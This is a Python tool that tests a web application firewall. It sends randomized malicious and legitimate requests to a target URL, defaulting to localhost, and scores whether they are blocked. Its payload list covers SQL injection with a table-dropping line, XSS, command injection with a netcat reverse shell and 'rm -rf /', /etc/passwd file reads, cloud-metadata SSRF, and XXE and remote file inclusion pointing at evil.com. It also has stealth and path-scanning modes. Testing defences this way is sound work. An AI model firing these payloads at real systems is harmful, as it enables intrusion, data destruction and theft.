#!/usr/bin/env python3
import argparse
import json
import random
import string
import time
import urllib.parse
import logging
import threading
import math
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from tqdm import tqdm
except ImportError:
    tqdm = None

# Suppress verbose warnings from urllib3.
logging.getLogger("urllib3").setLevel(logging.CRITICAL)

# Updated attack payloads including additional methods.
ATTACK_PAYLOADS = {
    "sqli": [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' OR 1=1--",
        "' OR '1'='1' --",
        "' AND SLEEP(5)--"
    ],
    "xss": [
        "<script>alert('XSS');</script>",
        "\" onmouseover=\"alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>"
    ],
    "cmd": [
        "; ls -la",
        "&& cat /etc/passwd",
        "| nc -e /bin/sh 127.0.0.1 4444",
        "`rm -rf /`"
    ],
    "lfi": [
        "../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/hosts"
    ],
    "rce": [
        "system('id');",
        "exec('whoami');",
        "php -r 'system(\"id\");'"
    ],
    "crlf": [
        "%0d%0aSet-Cookie:malicious=1",
        "%0d%0aContent-Length:0",
        "%0d%0aX-Custom-Header: test"
    ],
    "ssrf": [
        "http://127.0.0.1:80",
        "http://localhost:80",
        "http://169.254.169.254/latest/meta-data/",
        "http://example.com@127.0.0.1",
        "http://[::1]:80"
    ],
    "xxe": [
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY test SYSTEM \"http://evil.com/evil.dtd\">]><data>&test;</data>"
    ],
    "xpath": [
        "' or '1'='1",
        "\" or \"1\"=\"1",
        "' or count(//node)=1 or '1'='2"
    ],
    "nosql": [
        "{\"$ne\": null}",
        "{\"username\": {\"$gt\": \"\"}}",
        "{\"$where\": \"this.password.length > 0\"}"
    ],
    "http_smuggling": [
        "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\n"
    ],
    "shellshock": [
        "() { :;}; /bin/bash -c 'echo vulnerable'"
    ],
    "ldap": [
        "*)(|(uid=*))",
        "*)(&(|(userPassword=*))"
    ],
    "rfi": [
        "http://evil.com/shell.txt",
        "http://localhost/../../etc/passwd"
    ]
}


def generate_payload(attack_type: str) -> dict:
    """
    Generate a payload with one malicious parameter and 0-2 additional benign parameters.
    """
    malicious_param_names = ["q", "search", "input", "data"]
    benign_param_names = ["id", "user", "info"]
    params = {}
    mal_param = random.choice(malicious_param_names)
    payload_template = random.choice(ATTACK_PAYLOADS.get(attack_type, ATTACK_PAYLOADS["sqli"]))
    randomized_payload = payload_template + str(random.randint(1000, 9999))
    params[mal_param] = randomized_payload

    for _ in range(random.randint(0, 2)):
        benign_param = random.choice(benign_param_names)
        if benign_param in params:
            benign_param += str(random.randint(1, 100))
        benign_value = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        params[benign_param] = benign_value

    return params


def generate_legit_payload() -> dict:
    """
    Generate a payload that mimics legitimate traffic.
    """
    payload = {
        "page": random.randint(1, 100),
        "limit": random.choice([10, 20, 50, 100]),
        "sort": random.choice(["asc", "desc"]),
        "filter": ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))
    }
    if random.choice([True, False]):
        payload["search"] = ''.join(random.choices(string.ascii_letters, k=6))
    return payload


def generate_headers() -> dict:
    """
    Generate randomized HTTP headers.
    """
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
        "(KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
    ]
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
        "Connection": "keep-alive"
    }
    if random.choice([True, False]):
        random_suffix = ''.join(random.choices(string.ascii_lowercase, k=5))
        headers["Referer"] = "http://example.com/" + random_suffix
    return headers


def generate_cookies() -> str:
    """
    Generate a random cookie string mimicking session cookies.
    """
    cookies = {
        "sessionid": ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
        "csrftoken": ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    }
    return '; '.join(f"{k}={v}" for k, v in cookies.items())


def send_request(session: requests.Session, url: str, method: str, params: dict,
                 headers: dict, timeout: float, proxies: dict, verify: bool,
                 as_json: bool) -> requests.Response:
    """
    Send an HTTP request via the provided session.
    """
    method = method.upper()
    if method == "GET":
        full_url = url + "?" + urllib.parse.urlencode(params)
        return session.get(full_url, headers=headers, timeout=timeout, proxies=proxies, verify=verify)
    elif method == "POST":
        if as_json:
            return session.post(url, json=params, headers=headers, timeout=timeout, proxies=proxies, verify=verify)
        else:
            return session.post(url, data=params, headers=headers, timeout=timeout, proxies=proxies, verify=verify)
    else:
        if as_json:
            return session.request(method, url, json=params, headers=headers, timeout=timeout, proxies=proxies, verify=verify)
        else:
            return session.request(method, url, data=params, headers=headers, timeout=timeout, proxies=proxies, verify=verify)


class Stats:
    """
    Thread-safe statistics tracking including latency, response size metrics,
    status code distribution, and error/success rates.
    """
    def __init__(self):
        self.total = 0
        self.passes = 0
        self.errors = 0
        self.total_latency = 0.0
        self.latencies = []
        self.min_latency = None
        self.max_latency = None
        self.status_codes = {}
        self.response_sizes = []
        self.total_response_bytes = 0
        self.min_response_size = None
        self.max_response_size = None
        self.lock = threading.Lock()

    def record(self, latency: float, passed: bool, status_code: int = None, response_size: int = None):
        with self.lock:
            self.total += 1
            self.total_latency += latency
            self.latencies.append(latency)
            if self.min_latency is None or latency < self.min_latency:
                self.min_latency = latency
            if self.max_latency is None or latency > self.max_latency:
                self.max_latency = latency
            if passed:
                self.passes += 1
            if status_code is not None:
                self.status_codes[status_code] = self.status_codes.get(status_code, 0) + 1
            if response_size is not None:
                self.response_sizes.append(response_size)
                self.total_response_bytes += response_size
                if self.min_response_size is None or response_size < self.min_response_size:
                    self.min_response_size = response_size
                if self.max_response_size is None or response_size > self.max_response_size:
                    self.max_response_size = response_size

    def record_error(self):
        with self.lock:
            self.errors += 1

    def summary(self):
        with self.lock:
            avg_latency = self.total_latency / self.total if self.total else 0
            sorted_lat = sorted(self.latencies)
            median_latency = sorted_lat[len(sorted_lat) // 2] if sorted_lat else 0
            p95_latency = sorted_lat[int(0.95 * len(sorted_lat)) - 1] if len(sorted_lat) >= 1 else 0
            p99_latency = sorted_lat[int(0.99 * len(sorted_lat)) - 1] if len(sorted_lat) >= 1 else 0

            if self.response_sizes:
                avg_response_size = self.total_response_bytes / len(self.response_sizes)
                sorted_sizes = sorted(self.response_sizes)
                median_response = sorted_sizes[len(sorted_sizes) // 2]
                p95_response = sorted_sizes[int(0.95 * len(sorted_sizes)) - 1]
                p99_response = sorted_sizes[int(0.99 * len(sorted_sizes)) - 1]
            else:
                avg_response_size = median_response = p95_response = p99_response = 0

            if self.total:
                variance = sum((lat - avg_latency) ** 2 for lat in self.latencies) / self.total
                std_latency = math.sqrt(variance)
            else:
                std_latency = 0

            success_rate = (self.passes / self.total * 100) if self.total else 0
            error_rate = (self.errors / self.total * 100) if self.total else 0

            return {
                "total": self.total,
                "passes": self.passes,
                "errors": self.errors,
                "success_rate": success_rate,
                "error_rate": error_rate,
                "avg_latency": avg_latency,
                "min_latency": self.min_latency if self.min_latency is not None else 0,
                "max_latency": self.max_latency if self.max_latency is not None else 0,
                "median_latency": median_latency,
                "p95_latency": p95_latency,
                "p99_latency": p99_latency,
                "std_latency": std_latency,
                "status_codes": self.status_codes,
                "avg_response_size": avg_response_size,
                "min_response_size": self.min_response_size if self.min_response_size is not None else 0,
                "max_response_size": self.max_response_size if self.max_response_size is not None else 0,
                "median_response_size": median_response,
                "p95_response_size": p95_response,
                "p99_response_size": p99_response
            }


def worker(request_id: int, args, attack_types, session: requests.Session,
           stop_event: threading.Event, stats: Stats, total_requests: int) -> None:
    """
    Worker function to send a single request. Supports composite payloads,
    random HTTP method selection, retry logic, and behavior profiles.
    """
    if stop_event.is_set():
        return

    # --- Behavior Profile Handling ---
    current_legit_percent = args.legit_percent
    current_delay = args.delay
    method = args.method if not args.random_method else random.choice(["GET", "POST", "PUT", "DELETE", "OPTIONS"])
    url = args.url

    if args.behavior == "burst_calm":
        phase = request_id / total_requests
        if phase < 0.3:
            current_legit_percent = 0.0  # Burst phase: all malicious.
            current_delay = 0.05
            method = args.method if not args.random_method else random.choice(["GET", "POST", "PUT", "DELETE", "OPTIONS"])
            url = args.url
        elif phase < 0.6:
            current_legit_percent = args.legit_percent  # Calm phase.
            current_delay = args.delay * 2
            method = args.method if not args.random_method else random.choice(["GET", "POST", "PUT", "DELETE", "OPTIONS"])
            url = args.url
        else:
            # Scanning phase: simulate path scanning.
            current_legit_percent = args.legit_percent
            current_delay = args.delay
            method = "GET"
            scanning_endpoints = ["/admin", "/config", "/login", "/.git", "/backup", "/debug", "/wp-admin", "/test"]
            url = args.url.rstrip('/') + random.choice(scanning_endpoints)
    elif args.behavior == "stealth":
        current_legit_percent = max(args.legit_percent, 80)
        current_delay = args.delay * 3
        method = args.method if not args.random_method else random.choice(["GET", "POST"])
        url = args.url

    # --- Payload Selection ---
    if args.composite:
        legit_payload = generate_legit_payload()
        mal_payload = generate_payload(random.choice(attack_types))
        mal_payload_prefixed = {f"mal_{k}": v for k, v in mal_payload.items()}
        payload = {**legit_payload, **mal_payload_prefixed}
        expected_status = args.expected_status_composite
    else:
        if random.uniform(0, 100) < current_legit_percent:
            payload = generate_legit_payload()
            expected_status = args.expected_status_legit
        else:
            payload = generate_payload(random.choice(attack_types))
            expected_status = args.expected_status_malicious

    headers = generate_headers()
    if args.random_cookies:
        headers["Cookie"] = generate_cookies()

    # --- Retry Loop ---
    attempt = 0
    max_retries = args.max_retries
    retry_delay = args.retry_delay
    while attempt <= max_retries and not stop_event.is_set():
        start_time = time.time()
        try:
            response = send_request(session, url, method, payload, headers,
                                    timeout=args.timeout, proxies=args.proxies,
                                    verify=args.verify, as_json=args.json)
            status_code = response.status_code
            response_size = len(response.content) if response.content else 0
            latency = time.time() - start_time
            logging.info(
                f"Request {request_id} (Attempt {attempt+1}): {method} {url} with params {payload} -> "
                f"Status Code: {status_code} (Latency: {latency:.3f}s, Size: {response_size} bytes)"
            )
            if args.verbose:
                logging.info(f"Response Headers: {response.headers}")
                logging.info(f"Response Body: {response.text}")
            success = (status_code == expected_status)
            stats.record(latency, success, status_code, response_size)
            break
        except Exception as e:
            latency = time.time() - start_time
            logging.error(f"Request {request_id} (Attempt {attempt+1}): Error: {e} (Latency: {latency:.3f}s)")
            stats.record_error()
            attempt += 1
            if attempt <= max_retries:
                time.sleep(retry_delay)
            else:
                stats.record(latency, False, None, 0)
                if stats.errors >= args.max_errors:
                    logging.error(f"Exceeded maximum errors ({args.max_errors}). Signaling stop.")
                    stop_event.set()

    if args.delay:
        jitter = random.uniform(-args.delay_jitter, args.delay_jitter) if args.delay_jitter else 0
        actual_delay = max(0, current_delay + jitter)
        time.sleep(actual_delay)


def main():
    parser = argparse.ArgumentParser(
        description="Send malicious and legitimate requests to trigger WAF rules with advanced metrics, behavior profiles, and subtle traffic simulation."
    )
    parser.add_argument("--url", default="http://localhost:8080",
                        help="Target base URL (default: http://localhost:8080)")
    parser.add_argument("--method", default="GET", choices=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
                        help="Default HTTP method (default: GET)")
    parser.add_argument("--num-requests", type=int, default=100,
                        help="Total number of requests to send (default: 100)")
    parser.add_argument("--delay", type=float, default=1.0,
                        help="Base delay between requests in seconds (default: 1.0)")
    parser.add_argument("--delay-jitter", type=float, default=0.0,
                        help="Maximum jitter (+/-) to add to the delay (default: 0.0)")
    parser.add_argument("--attack-type", choices=list(ATTACK_PAYLOADS.keys()) + ["all"],
                        default="all", help="Attack payload type (default: all)")
    parser.add_argument("--legit-percent", type=float, default=0.0,
                        help="Percentage of requests that are legitimate (0-100, default: 0)")
    parser.add_argument("--composite", action="store_true",
                        help="Compose requests with both legitimate and malicious parameters")
    parser.add_argument("--max-errors", type=int, default=3,
                        help="Max errors before exiting (default: 3)")
    parser.add_argument("--timeout", type=float, default=5.0,
                        help="HTTP request timeout in seconds (default: 5.0)")
    parser.add_argument("--max-retries", type=int, default=0,
                        help="Maximum number of retries for a failed request (default: 0)")
    parser.add_argument("--retry-delay", type=float, default=0.1,
                        help="Delay between retries in seconds (default: 0.1)")
    parser.add_argument("--seed", type=int, default=None,
                        help="Random seed for reproducibility")
    parser.add_argument("--proxy", type=str, default=None,
                        help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--threads", type=int, default=1,
                        help="Number of concurrent threads (default: 1)")
    parser.add_argument("--random-method", action="store_true",
                        help="Select a random HTTP method per request")
    parser.add_argument("--random-cookies", action="store_true",
                        help="Include random cookie headers")
    parser.add_argument("--random-path", action="store_true",
                        help="Append a random path segment to the base URL")
    parser.add_argument("--json", action="store_true",
                        help="Send payload as JSON instead of form data")
    parser.add_argument("--log-file", type=str, default=None,
                        help="Log output to a file")
    parser.add_argument("--progress", action="store_true",
                        help="Display a progress bar (requires tqdm)")
    parser.add_argument("--score", action="store_true",
                        help="Compute overall test score based on expected status codes")
    parser.add_argument("--expected-status-legit", type=int, default=200,
                        help="Expected status code for legitimate requests (default: 200)")
    parser.add_argument("--expected-status-malicious", type=int, default=403,
                        help="Expected status code for malicious requests (default: 403)")
    parser.add_argument("--expected-status-composite", type=int, default=200,
                        help="Expected status code for composite requests (default: 200)")
    parser.add_argument("--behavior", choices=["default", "burst_calm", "stealth"],
                        default="default", help="Behavior profile to simulate different attack patterns")
    parser.add_argument("--verbose", action="store_true",
                        help="Enable verbose logging")
    parser.add_argument("--insecure", action="store_true", default=False,
                        help="Disable SSL certificate verification")
    parser.add_argument("--json-summary-file", type=str, default=None,
                        help="If provided, output the summary in JSON format to this file")
    args = parser.parse_args()

    # Setup logging: if progress is enabled, set console level to WARNING.
    log_format = "%(asctime)s [%(levelname)s] %(message)s"
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)
    formatter = logging.Formatter(log_format)
    logger.handlers = []
    if args.log_file:
        fh = logging.FileHandler(args.log_file)
        fh.setLevel(logging.INFO)
        fh.setFormatter(formatter)
        logger.addHandler(fh)
    ch = logging.StreamHandler()
    ch.setLevel(logging.WARNING if args.progress else logging.INFO)
    ch.setFormatter(formatter)
    logger.addHandler(ch)

    if args.seed is not None:
        random.seed(args.seed)

    # Determine attack types.
    if args.attack_type == "all":
        attack_types = list(ATTACK_PAYLOADS.keys())
    else:
        attack_types = [args.attack_type]

    args.proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    args.verify = not args.insecure

    stats = Stats()
    stop_event = threading.Event()
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, pool_block=True)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    start_time = time.time()
    total_requests = args.num_requests
    worker_args = (args, attack_types, session, stop_event, stats, total_requests)

    if args.threads > 1:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = [executor.submit(worker, i, *worker_args) for i in range(1, total_requests + 1)]
            if args.progress and tqdm:
                for _ in tqdm(as_completed(futures), total=len(futures), desc="Requests"):
                    pass
            else:
                for future in as_completed(futures):
                    pass
    else:
        iterator = range(1, total_requests + 1)
        if args.progress and tqdm:
            iterator = tqdm(iterator, desc="Requests")
        for i in iterator:
            if stop_event.is_set():
                break
            worker(i, *worker_args)

    total_time = time.time() - start_time
    summary = stats.summary()
    throughput = summary['total'] / total_time if total_time > 0 else 0

    logging.info(
        f"Finished: Total Requests: {summary['total']}, Passes: {summary['passes']}, Errors: {summary['errors']}, "
        f"Avg Latency: {summary['avg_latency']:.3f}s, Std Latency: {summary['std_latency']:.3f}s, "
        f"Min Latency: {summary['min_latency']:.3f}s, Max Latency: {summary['max_latency']:.3f}s, "
        f"Median: {summary['median_latency']:.3f}s, P95: {summary['p95_latency']:.3f}s, "
        f"P99: {summary['p99_latency']:.3f}s, Throughput: {throughput:.2f} req/s, Total Duration: {total_time:.2f}s"
    )

    print("\n--- Test Summary ---")
    print(f"Total Requests       : {summary['total']}")
    print(f"Passed               : {summary['passes']} ({summary['success_rate']:.2f}% success)")
    print(f"Errors               : {summary['errors']} ({summary['error_rate']:.2f}% error)")
    print(f"Avg Latency          : {summary['avg_latency']:.3f} seconds")
    print(f"Std Latency          : {summary['std_latency']:.3f} seconds")
    print(f"Min Latency          : {summary['min_latency']:.3f} seconds")
    print(f"Max Latency          : {summary['max_latency']:.3f} seconds")
    print(f"Median Latency       : {summary['median_latency']:.3f} seconds")
    print(f"P95 Latency          : {summary['p95_latency']:.3f} seconds")
    print(f"P99 Latency          : {summary['p99_latency']:.3f} seconds")
    print(f"Throughput           : {throughput:.2f} requests/second")
    print("")
    print(f"Avg Response Size    : {summary['avg_response_size']:.0f} bytes")
    print(f"Min Response Size    : {summary['min_response_size']} bytes")
    print(f"Max Response Size    : {summary['max_response_size']} bytes")
    print(f"Median Response Size : {summary['median_response_size']} bytes")
    print(f"P95 Response Size    : {summary['p95_response_size']} bytes")
    print(f"P99 Response Size    : {summary['p99_response_size']} bytes")
    print("")
    print(f"Status Code Distribution: {summary['status_codes']}")
    print(f"Total Duration       : {total_time:.2f} seconds")
    if args.score:
        score_percent = (summary['passes'] / summary['total'] * 100) if summary['total'] else 0
        print(f"Test Score           : {summary['passes']}/{summary['total']} ({score_percent:.2f}%)")
        if summary['passes'] < summary['total']:
            print("Overall Test         : FAILED (unexpected status codes encountered)")
        else:
            print("Overall Test         : PASSED (all responses matched expected status codes)")

    if args.json_summary_file:
        try:
            with open(args.json_summary_file, "w") as jf:
                json.dump({
                    "summary": summary,
                    "throughput_req_per_sec": throughput,
                    "total_duration_sec": total_time
                }, jf, indent=4)
            print(f"\nJSON summary written to: {args.json_summary_file}")
        except Exception as e:
            print(f"\nError writing JSON summary: {e}")


if __name__ == "__main__":
    main()
